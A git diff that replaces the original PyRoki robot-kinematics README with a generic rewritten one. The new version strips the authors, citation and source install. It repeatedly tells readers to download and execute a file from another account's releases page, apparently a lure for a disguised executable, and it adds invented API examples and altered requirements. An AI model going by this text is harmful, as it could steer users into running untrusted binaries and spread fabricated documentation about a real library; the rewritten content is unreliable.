@@ -1,66 +1,130 @@
-# `PyRoki`: Python Robot Kinematics Library
+# Pyroki: A Modular Toolkit for Robot Kinematic Optimization 🤖
 
-**[Project page](https://pyroki-toolkit.github.io/) &bull;
-[arXiv](https://arxiv.org/abs/2505.03728)**
+![Pyroki Logo](https://img.shields.io/badge/Pyroki-Toolkit-brightgreen)  
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/clearn23/pyroki/releases)
 
-`PyRoki` is a modular, extensible, and cross-platform toolkit for kinematic optimization, all in Python.
+Welcome to the Pyroki repository! This toolkit is designed to help developers and researchers optimize robot kinematics in a modular and efficient way. With Pyroki, you can streamline your robotic projects and improve their performance.
 
-Core features include:
-- Differentiable robot forward kinematics model from a URDF.
-- Automatic generation of robot collision primitives (e.g., capsules).
-- Differentiable collision bodies with numpy broadcasting logic.
-- Common cost implementations (e.g., end effector pose, self/world-collision, manipulability).
-- Arbitrary costs, autodiff or analytical Jacobians.
-- Integration with a [Levenberg-Marquardt Solver](https://github.com/brentyi/jaxls).
-- Cross-platform support (CPU, GPU, TPU).
+## Table of Contents
 
-Please refer to the [documentation](https://chungmin99.github.io/pyroki/) for more details, features, and usage examples.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
+## Introduction
 
----
+Robotics is a rapidly evolving field. The need for efficient kinematic optimization is crucial for developing advanced robotic systems. Pyroki provides a set of tools to help you tackle this challenge. Our modular approach allows you to customize the toolkit to fit your specific needs.
 
+## Features
+
+- **Modular Design**: Add or remove components based on your project requirements.
+- **User-Friendly Interface**: Easy to navigate and implement.
+- **Performance Optimization**: Advanced algorithms to enhance robot movement and efficiency.
+- **Extensive Documentation**: Comprehensive guides and examples to help you get started.
+- **Active Community**: Join a community of developers and researchers who share your passion.
 
 ## Installation
-You can install `pyroki` with `pip`, with Python 3.12+:
 
-```
-git clone https://github.com/chungmin99/pyroki.git
-cd pyroki
-pip install -e .
-```
+To get started with Pyroki, you need to download the latest release. Visit our [Releases section](https://github.com/clearn23/pyroki/releases) to find the appropriate version for your system. Download the file and execute it to install Pyroki.
 
+### Prerequisites
 
-## Status
+Before you install Pyroki, ensure you have the following:
 
-_May 6, 2025_: Initial release
+- Python 3.6 or higher
+- Pip (Python package installer)
+- Basic understanding of robotics and kinematics
 
-We are preparing and will release by _May 16, 2025_:
-- [ ] Examples + documentation for hand / humanoid motion retargeting
-- [ ] Documentation for using manually defined Jacobians.
-- [ ] Support with python 3.10+
+### Steps to Install
 
+1. Go to the [Releases section](https://github.com/clearn23/pyroki/releases).
+2. Download the latest release suitable for your operating system.
+3. Execute the downloaded file.
+4. Follow the on-screen instructions to complete the installation.
 
-## Citation
+## Usage
 
-This codebase is released with the following preprint.
-<table><tr><td>
-    Chung Min Kim*, Brent Yi*, Hongsuk Choi, Yi Ma, Ken Goldberg, Angjoo Kanazawa.
-    <strong>PyRoki: A Modular Toolkit for Robot Kinematic Optimization</strong>
-    arXiV, 2025.
-</td></tr>
-</table>
+Once installed, you can start using Pyroki in your projects. Here’s a simple example to help you get started:
 
-<sup>*</sup><em>Equal Contribution</em>, <em>UC Berkeley</em>.
+```python
+import pyroki
 
-Please cite PyRoki if you find this work useful for your research:
+# Initialize the robot
+robot = pyroki.Robot()
 
-```
-@article{pyroki2025,
- author = {Kim, Chung Min* and Yi, Brent* and Choi, Hongsuk and Ma, Yi and Goldberg, Ken and Kanazawa, Angjoo},
- title = {PyRoki: A Modular Toolkit for Robot Kinematic Optimization},
- journal = {arXiv},
- year = {2025},
-} 
+# Set parameters
+robot.set_parameters(max_speed=5, max_acceleration=10)
+
+# Optimize kinematics
+optimized_path = robot.optimize_kinematics(start_position, end_position)
+
+# Execute the optimized path
+robot.execute_path(optimized_path)
 ```
 
-Thanks!
+This example shows how to initialize a robot, set its parameters, optimize its kinematics, and execute the optimized path.
+
+## Examples
+
+Here are a few examples to illustrate the capabilities of Pyroki:
+
+### Example 1: Basic Kinematic Optimization
+
+```python
+import pyroki
+
+robot = pyroki.Robot()
+robot.set_parameters(max_speed=3, max_acceleration=8)
+
+start = (0, 0)
+end = (10, 10)
+
+path = robot.optimize_kinematics(start, end)
+robot.execute_path(path)
+```
+
+### Example 2: Complex Path Planning
+
+```python
+import pyroki
+
+robot = pyroki.Robot()
+robot.set_parameters(max_speed=4, max_acceleration=9)
+
+waypoints = [(0, 0), (5, 5), (10, 0)]
+optimized_path = robot.optimize_path(waypoints)
+
+robot.execute_path(optimized_path)
+```
+
+These examples demonstrate how easy it is to implement kinematic optimization with Pyroki.
+
+## Contributing
+
+We welcome contributions to Pyroki! If you would like to help improve the toolkit, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Open a pull request to the main repository.
+
+Please ensure your code follows the existing style and includes tests where applicable.
+
+## License
+
+Pyroki is licensed under the MIT License. You can freely use, modify, and distribute the toolkit, provided you include the original license.
+
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Email**: support@pyroki.com
+- **GitHub Issues**: Use the Issues tab in this repository to report bugs or request features.
+
+Thank you for using Pyroki! We hope it helps you in your robotic projects. For the latest updates, always check the [Releases section](https://github.com/clearn23/pyroki/releases).
